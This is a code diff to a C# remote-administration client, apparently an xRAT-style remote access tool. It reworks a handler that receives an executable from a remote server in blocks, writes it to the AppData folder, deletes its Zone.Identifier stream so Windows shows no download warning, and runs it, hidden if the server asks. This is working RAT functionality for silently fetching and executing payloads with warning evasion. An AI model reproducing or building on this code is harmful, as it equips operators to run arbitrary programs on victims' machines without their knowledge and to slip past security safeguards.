@@ -97,19 +97,24 @@ namespace xClient.Core.Commands
 
 		public static void HandleUploadAndExecute(Packets.ServerPackets.UploadAndExecute command, Client client)
 		{
-			//TODO: rework like DownloadFile
-			new Thread(() =>
+			string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), command.FileName);
+
+			try
 			{
-				string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), command.FileName);
+				if (command.CurrentBlock == 0 && command.Block[0] != 'M' && command.Block[1] != 'Z')
+					throw new Exception("No executable file");
 
-				try
+				FileSplit destFile = new FileSplit(filePath);
+
+				if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
 				{
-					if (command.FileBytes[0] != 'M' && command.FileBytes[1] != 'Z')
-						throw new Exception("no pe file");
+					new Packets.ClientPackets.Status(string.Format("Writing failed: {0}", destFile.LastError)).Execute(client);
+				    return;
+				}
 
-					File.WriteAllBytes(tempFile, command.FileBytes);
-
-					DeleteFile(tempFile + ":Zone.Identifier");
+				if ((command.CurrentBlock + 1) == command.MaxBlocks) // execute
+				{
+					DeleteFile(filePath + ":Zone.Identifier");
 
 					ProcessStartInfo startInfo = new ProcessStartInfo();
 					if (command.RunHidden)
@@ -118,18 +123,17 @@ namespace xClient.Core.Commands
 						startInfo.CreateNoWindow = true;
 					}
 					startInfo.UseShellExecute = command.RunHidden;
-					startInfo.FileName = tempFile;
+					startInfo.FileName = filePath;
 					Process.Start(startInfo);
-				}
-				catch
-				{
-					DeleteFile(tempFile);
-					new Packets.ClientPackets.Status("Execution failed!").Execute(client);
-					return;
-				}
 
-				new Packets.ClientPackets.Status("Executed File!").Execute(client);
-			}).Start();
+					new Packets.ClientPackets.Status("Executed File!").Execute(client);
+				}
+			}
+			catch (Exception ex)
+			{
+				DeleteFile(filePath);
+				new Packets.ClientPackets.Status(string.Format("Execution failed: {0}", ex.Message)).Execute(client);
+			}
 		}
 
 		public static void HandleUninstall(Packets.ServerPackets.Uninstall command, Client client)
